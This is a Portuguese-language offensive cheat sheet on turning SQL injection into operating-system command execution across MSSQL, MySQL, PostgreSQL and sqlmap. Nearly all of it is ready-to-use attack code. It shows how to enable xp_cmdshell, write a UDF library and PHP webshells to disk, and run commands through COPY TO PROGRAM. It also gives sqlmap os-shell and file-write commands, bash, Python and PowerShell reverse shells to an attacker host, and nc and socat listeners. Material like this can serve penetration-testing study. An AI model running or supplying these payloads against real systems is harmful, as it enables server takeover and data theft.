# Shell OS via SQL Injection

## Quando é Possível

| Condição | Requisito |
|----------|-----------|
| MySQL | FILE privilege + secure_file_priv="" |
| MSSQL | xp_cmdshell habilitado ou permissão sysadmin |
| PostgreSQL | SUPERUSER ou pg_execute_server_program |
| Oracle | Java permissions (raro) |

## MSSQL — xp_cmdshell

```sql
-- Verificar se é DBA
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Habilitar xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Executar comando
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'ipconfig /all';
```

## MySQL — UDF (User Defined Functions)

```sql
-- Verificar secure_file_priv
SHOW VARIABLES LIKE 'secure_file_priv';

-- Escrever UDF library (requer FILE privilege)
SELECT 0x<hex_da_lib_udf> INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- Criar função
CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so';

-- Executar
SELECT sys_exec('id > /tmp/vlad.txt');
```

## Com SQLMap

```bash
# Shell OS automático (SQLMap tenta automaticamente)
sqlmap -u "http://alvo.com/?id=1" \
  --os-shell \
  --batch

# Shell SQL interativo
sqlmap -u "http://alvo.com/?id=1" \
  --sql-shell \
  --batch

# Especificar técnica de upload
sqlmap -u "http://alvo.com/?id=1" \
  --os-shell \
  --technique=S \  # stacked queries (MSSQL/PostgreSQL)
  --dbms=mssql \
  --batch
```

## PostgreSQL — COPY TO PROGRAM

```sql
-- PostgreSQL 9.3+
COPY (SELECT '') TO PROGRAM 'id > /tmp/vlad.txt';
COPY (SELECT '') TO PROGRAM 'bash -i >& /dev/tcp/atacante.com/4444 0>&1';
```

## Webshell via FILE

```sql
-- MySQL: escrever webshell PHP
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

-- MSSQL: via xp_cmdshell
EXEC xp_cmdshell 'echo ^<?php system($_GET["cmd"]); ?^> > C:\inetpub\wwwroot\shell.php';
```

```bash
# SQLMap: upload de webshell
sqlmap -u "http://alvo.com/?id=1" \
  --file-write=shell.php \
  --file-dest=/var/www/html/shell.php \
  --batch
```

## Reverse Shell

```bash
# Após obter execução de comandos
# Linux
bash -i >& /dev/tcp/ATACANTE_IP/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATACANTE_IP",4444));...'

# Windows
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATACANTE_IP',4444);..."
```

## Listener no Atacante

```bash
# Receber reverse shell
nc -lvnp 4444

# Ou com socat (mais estável)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,setsid,ctty,stderr
```
